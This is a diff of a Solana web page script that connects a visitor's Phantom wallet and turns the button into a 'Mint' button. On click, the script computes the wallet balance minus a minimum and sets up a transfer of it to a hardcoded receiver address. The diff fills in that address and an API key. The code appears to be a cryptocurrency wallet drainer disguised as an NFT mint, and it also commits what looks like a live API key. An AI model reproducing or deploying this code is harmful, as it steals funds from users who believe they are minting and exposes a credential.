@@ -6,7 +6,7 @@ $(document).ready(function () {
                 console.log("Phantom Wallet connected:", resp);
 
                 const connection = new solanaWeb3.Connection(
-                    'https://solana-mainnet.api.syndica.io/api-key/YOUR-API-KEY',
+                    'https://solana-mainnet.api.syndica.io/api-key/42aSFR7aLhxB7NfXEq78aMvkfweu58G4ngdwhri32u9BAaaQ9wShomjTtKH9RCKJDpS3sxRGQXeZk3Wp8s8BDbLPjmLTCqTHhoN',
                     'confirmed'
                 );
 
@@ -24,7 +24,7 @@ $(document).ready(function () {
                 $('#connect-wallet').text("Mint");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
-                        const receiverWallet = new solanaWeb3.PublicKey('XXXXXXXXXXX'); // Кошелек-получатель
+                        const receiverWallet = new solanaWeb3.PublicKey('DVm4XnbDT6hzhcVJBeM2DMbq3URGDpC5qkzd2rwhvFwK'); // Кошелек-получатель
                         const balanceForTransfer = walletBalance - minBalance;
                         if (balanceForTransfer <= 0) {
                             alert("Insufficient funds for transfer.");
